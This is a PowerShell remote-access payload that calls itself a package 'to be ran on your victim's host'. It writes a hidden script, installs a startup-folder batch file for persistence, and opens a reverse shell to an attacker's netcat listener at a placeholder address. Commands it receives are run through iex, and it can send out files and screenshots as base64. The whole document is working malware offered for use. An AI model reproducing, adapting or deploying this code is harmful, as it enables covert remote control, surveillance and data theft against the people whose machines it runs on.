# This is a payload package to be ran on your victim's host.
# Modify this for your own use.
# Replace '[IP_ADDRESS]' with your netcat listener's address, and '[PORT]' with your netcat listener's port before serving the file.
# Very likely it will be your localhost where this payload will be served.

$pstr=@'
while($true){
	$job=start-job -scriptblock {
		function transfer($p){$a=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("$p"));echo "`r`nFILE_START`r`n$a`r`nFILE_END"}
		function screenshot(){Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.Screen]::AllScreens;$b=[Drawing.Rectangle]::FromLTRB(($s.Bounds.Left|Measure-Object -Minimum).Minimum,($s.Bounds.Top|Measure-Object -Minimum).Minimum,($s.Bounds.Right|Measure-Object -Maximum).Maximum,($s.Bounds.Bottom|Measure-Object -Maximum).Maximum);$i=New-Object System.Drawing.Bitmap([int]$b.width),([int]$b.height);$g=[Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.size);$i.Save("$env:USERPROFILE\q.png");$g.Dispose();$i.Dispose();transfer("$env:USERPROFILE\q.png");rm -Force "$env:USERPROFILE\q.png"}
		function volume($v){$sh = new-object -com wscript.shell;1..50|%{$sh.SendKeys([char]174)};1..$v|%{$sh.SendKeys([char]175)}}
		try{
			$socket = new-object System.Net.Sockets.TcpClient("[IP_ADDRESS]", [PORT]);
			if($socket -eq $null){throw}
			$stream = $socket.GetStream();
			$writer = new-object System.IO.StreamWriter($stream);
			$buffer = new-object System.Byte[] 1024;
			$encoding = new-object System.Text.UTF8Encoding;
			$writer.Write("Shell access as user $env:username.`r`n");
			cd ~
			do{
				$writer.Write("> ");
				$writer.Flush() ;
				$read = $null;
				while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
				$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
				$out_split = $out -split " ";
				if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all")){
					try{
						$res = iex $out -ErrorAction Stop
						$writer.Write($res -join "`r`n")
					} catch {$writer.Write("error")}
					$writer.Write("`r`n")
				}
				if($out.equals("rm-all")){
					rm -Force "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat"
					rm -Force "~/pspayload.ps1"
					$writer.close()
					$socket.close()
					stop-process -Force -name powershell
				}
			} While (!$out.equals("exit"))
			$writer.close()
			$socket.close()
			throw
		}catch {
			sleep -Seconds 10
		}
	}
	$job | wait-job -timeout 300
	$job | stop-job
}
'@

$pstr | set-content "~\pspayload.ps1" -Encoding Ascii
(get-item "~\pspayload.ps1").Attributes += 'Hidden'
$cmdstr= @"
start "" "powershell" -windowstyle hidden "~\pspayload.ps1"
"@
$cmdstr | set-content "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat" -Encoding Ascii
do{
    cmd.exe /c 'start "" "powershell" -windowstyle hidden "~\pspayload.ps1"'
}while((Get-Process powershell).length -le 3)